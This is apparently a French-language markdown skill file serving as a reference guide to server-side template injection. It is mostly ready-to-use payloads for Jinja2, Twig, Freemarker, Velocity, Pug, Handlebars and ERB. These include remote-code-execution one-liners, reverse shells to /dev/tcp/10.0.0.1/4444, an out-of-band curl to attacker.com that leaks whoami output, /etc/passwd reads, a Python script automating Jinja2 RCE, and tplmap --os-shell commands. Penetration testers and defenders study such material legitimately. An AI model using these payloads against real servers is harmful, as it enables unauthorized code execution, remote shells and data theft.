---
name: ssti-server-side-template-injection
description: Guide complet de Server-Side Template Injection — tous les moteurs (Jinja2, Twig, Freemarker, Velocity, Jade/Pug, Handlebars, Go), detection, RCE, blind SSTI et outils.
category: cybersecurite
tags: [ssti, template-injection, jinja2, twig, freemarker, velocity, jade, pug, handlebars, rce, server-side]
---

# Server-Side Template Injection (SSTI)

## Sommaire
1. [Détection](#detection)
2. [Jinja2 / Flask / Python](#jinja2--flask--python)
3. [Twig / PHP](#twig--php)
4. [Freemarker / Java](#freemarker--java)
5. [Velocity / Java](#velocity--java)
6. [Pug / Jade / Node.js](#pug--jade--nodejs)
7. [Handlebars / Node.js](#handlebars--nodejs)
8. [Go Templates](#go-templates)
9. [ERB / Ruby](#erb--ruby)
10. [Outils](#outils)

## Détection

### Test universel :
```
# Payload de test
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

### Réponses attendues :
```
Si le template affiche "49" → SSTI probable
Si le template affiche "{{7*7}}" → pas de SSTI
Si le template affiche "7777777" → SSTI possible
```

### Identification du moteur :
Utiliser des payloads spécifiques à chaque moteur :
```
# Python (Jinja2, Mako, Tornado)
{{7*7}}
{{config}}
{{self.__class__}}

# Java (Freemarker, Velocity)
${7*7}
${7*7} 
#{7*7}

# PHP (Twig, Smarty)
{{7*7}}
{$smarty.version}

# Ruby (ERB)
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>

# Go
{{.}}
{{printf "%s" "test"}}
```

## Jinja2 / Flask / Python

### Détection :
```jinja
{{7*7}}
{{7*'7'}}  # → "7777777" (multiplication de string)
```

### Exploration des objets :
```jinja
# Classes disponibles
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Config Flask
{{config}}
{{config.__class__.__init__.__globals__}}
{{request.application.__globals__}}
```

### RCE via Jinja2 :
```jinja
# Méthode 1: __builtins__
{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Méthode 2: subclasses
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}

# Méthode 3: cycler (si disponible)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Méthode 4: lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Méthode 5: request (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Blind SSTI Jinja2 :
```jinja
# Time-based
{% if ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__.__builtins__.__import__('os').popen('id') %}delay{% endif %}

# Out-of-band (DNS/HTTP)
{{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('curl http://attacker.com/$(whoami)').read()}}
```

### Reverse shell Jinja2 :
```jinja
{{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read()}}
```

### Exploit automatisé Python :
```python
import requests

def jinja2_rce(url, param, cmd):
    """RCE via SSTI Jinja2"""
    payload = "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('" + cmd + "').read()}}"
    r = requests.post(url, data={param: payload})
    return r.text
```

## Twig / PHP

### Détection :
```
{{7*7}}
{{'test'|upper}}  # → "TEST"
```

### Exploration :
```
# Version de Twig
{{_self}}
{{_self.env}}
{{_self.env.getLoader()}}
```

### RCE via Twig :
```
# Méthode 1: _self.env
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Méthode 2: sort
{{['id']|filter('system')}}

# Méthode 3: map
{{['id']|map('system')}}

# Méthode 4: getFunctions
{{_self.env.getFunctions()}}

# One-liner RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{['cat /etc/passwd']|filter('system')}}
```

### Reverse shell Twig :
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")}}
```

## Freemarker / Java

### Détection :
```
${7*7}
#{7*7}
${"test"?upper_case}
```

### Exploration :
```
${.class}
${.version}
${.locale}
${.lang}
${.globals}
${.main}
${.current_template}
```

### RCE via Freemarker :
```ftl
# Méthode 1: exécution directe
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Méthode 2: ObjectConstructor
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.Runtime").getRuntime().exec("id")}

# Méthode 3: Jython
<#assign x="freemarker.template.utility.JythonRuntime"?new()>${x.exec("import os; os.system('id')")}
```

### Payload compact Freemarker :
```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
```

### Reverse shell Freemarker :
```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")}
```

## Velocity / Java

### Détection :
```
#set($x = 7*7)
$x
#set($x = "test")
$x.toUpperCase()
```

### Exploration :
```
#set($x = $class)
$x
#set($x = $request)
$x
```

### RCE via Velocity :
```velocity
#set($str = $class.inspect("java.lang.String").type)
#set($chr = $class.inspect("java.lang.Character").type)
#set($ex = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out = $ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Payload compact Velocity :
```velocity
#set($e="exec")
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().$e("id"))
$x.waitFor()
#set($s=$class.inspect("java.lang.String").type)
$s.valueOf($x.getInputStream().readAllBytes())
```

## Pug / Jade / Node.js

### Détection :
```pug
#{7*7}
#{"test".toUpperCase()}
```

### Exploration :
```pug
#{this}
#{global}
#{process}
```

### RCE via Pug :
```pug
- var x = require('child_process').execSync('id')
= x.toString()
```

### RCE via Jade :
```jade
= global.process.mainModule.require('child_process').execSync('id')
```

## Handlebars / Node.js

### Détection :
```handlebars
{{7*7}}
{{"test".toUpperCase}}
```

### Exploration :
```handlebars
{{this}}
{{this.__proto__}}
```

### RCE via Handlebars :
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Go Templates

### Détection :
```go
{{.}}
{{printf "%s" "test"}}
```

### Exploration :
```go
{{.FieldName}}
{{.Nested.Field}}
```

### RCE via Go templates (si accès aux fonctions) :
```go
{{define "T"}}
    {{. | getenv "PATH"}}
{{end}}
```

## ERB / Ruby

### Détection :
```
<%= 7*7 %>
<%= "test".upcase %>
```

### RCE :
```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
```

## Outils

### TplMap (détection SSTI) :
```bash
# Installation
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt

# Scan
python tplmap.py -u 'http://target.com/page?name=*'

# RCE
python tplmap.py -u 'http://target.com/page?name=*' --os-shell

# Blind SSTI
python tplmap.py -u 'http://target.com/page?name=*' --engine jinja2
```

### curl test commands :
```bash
# Test SSTI basique
curl -s "http://target.com/?name={{7*7}}"
curl -s "http://target.com/?name=${7*7}"

# Test avec POST
curl -X POST -d "name={{config}}" http://target.com/

# Test blind SSTI (time-based)
curl -s "http://target.com/?name={%25%20if%20''.__class__.__mro__[1].__subclasses__()[X]%20%25%7Ddelay"
```

### SSTI Detection payloads :
```
{{7*7}}       → Python/jinja2/mako/tornado
${7*7}        → Java/Freemarker/Velocity
<%= 7*7 %>    → Ruby/ERB
{{7*7}}       → PHP/Twig
{$7*7}        → PHP/Smarty
{{7*7}}       → JS/Handlebars/Mustache
#{7*7}        → Java/Freemarker
*{7*7}        → Java/Struts2
```

## Ressources
- **HackTricks SSTI** : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- **PortSwigger SSTI** : https://portswigger.net/web-security/server-side-template-injection
- **PayloadsAllTheThings SSTI** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- **TplMap** : https://github.com/epinna/tplmap
- **Jinja2 RCE** : https://jinja.palletsprojects.com/
- **Freemarker Manual** : https://freemarker.apache.org/docs/